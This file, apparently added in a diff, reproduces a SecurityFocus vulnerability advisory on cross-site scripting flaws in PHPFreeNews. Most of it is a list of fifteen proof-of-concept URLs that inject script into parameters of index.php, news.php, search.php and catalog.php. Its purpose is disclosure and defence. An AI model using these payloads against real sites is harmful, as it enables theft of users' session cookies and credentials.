@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/14439/info
+
+PHPFreeNews is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://[target]/[path]/index.php?front_indextitle=</title><script>alert(document.cookie)</script>
+http://[target]/[path]/index.php?front_searchsubmit="><script>alert(document.cookie)</script>
+http://[target]/[path]/index.php?front_latestnews="><script>alert(document.cookie)</script>
+http://[target]/[path]/news.php?newsid="><script>alert(document.cookie)</script>
+http://[target]/[path]/news.php?front_rating="><script>alert(document.cookie)</script>
+http://[target]/[path]/news.php?salt="><script>alert(document.cookie)</script>
+http://[target]/[path]/news.php?front_letmerateit="><script>alert(document.cookie)</script>
+http://[target]/[path]/news.php?front_ratebest="><script>alert(document.cookie)</script>
+http://[target]/[path]/news.php?front_ratesubmit="><script>alert(document.cookie)</script>
+http://[target]/[path]/news.php?front_searchsubmit="><script>alert(document.cookie)</script>
+http://[target]/[path]/search.php?front_searchresult=</title><script>alert(document.cookie)</script>
+http://[target]/[path]/search.php?front_searchsubmit="><script>alert(document.cookie)</script>
+http://[target]/[path]/catalog.php?front_searchsubmit="><script>alert(document.cookie)</script>
+http://[target]/[path]/catalog.php?front_latestnews="><script>alert(document.cookie)</script>
+http://[target]/[path]/catalog.php?catalogid="><script>alert(document.cookie)</script> 
